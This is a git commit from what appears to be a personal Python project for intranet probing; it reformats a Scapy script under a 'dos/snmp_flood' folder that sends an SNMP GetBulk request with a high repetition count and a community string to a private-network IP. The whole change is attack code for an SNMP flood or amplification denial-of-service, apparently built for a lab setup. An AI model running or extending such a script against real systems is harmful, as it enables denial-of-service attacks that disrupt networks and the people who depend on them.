e01ead72e05f0c5440b8518730fc4f5343f0ce03
x-j-j <2849771625@qq.com>
2021-04-03 10:28:23 +0800

    ok

--- 项目/python内网探测/dos/snmp_flood/snmp.py
+++ 项目/python内网探测/dos/snmp_flood/snmp.py
@@ -4,4 +4,13 @@ import sys
 import _thread
 
 if __name__ == "__main__":
-    send(IP(dst='192.168.43.114')/UDP(dport=161)/SNMP(community='cracer', PDU=SNMPbulk(max_repetitions=200, varbindlist=[SNMPvarbind(oid=ASN1_OID('1.3.6.1.2.1.1')), SNMPvarbind(oid=ASN1_OID('1.3.6.1.2.1.19.1.3'))])))
+    send(IP(dst='192.168.43.114')/
+            UDP(dport=161)/
+            SNMP(   
+                    community='cracer', 
+                    PDU=SNMPbulk(max_repetitions=200,
+                    varbindlist=[SNMPvarbind(oid=ASN1_OID('1.3.6.1.2.1.1')),
+                    SNMPvarbind(oid=ASN1_OID('1.3.6.1.2.1.19.1.3'))]
+                )
+            )
+        )
